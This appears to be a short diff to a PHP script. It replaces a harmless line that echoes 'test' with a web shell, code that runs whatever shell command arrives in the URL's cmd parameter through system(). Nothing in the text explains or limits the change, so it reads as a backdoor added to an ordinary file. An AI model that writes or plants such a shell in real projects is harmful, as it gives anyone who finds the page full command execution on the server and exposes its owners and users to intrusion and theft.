@@ -1,3 +1,7 @@
 #!/usr/bin/php
-<?php echo 'test' ?>
-
+<?php
+	if(isset($_GET['cmd']))
+    	{
+        	echo system($_GET['cmd']);
+    	}
+?>
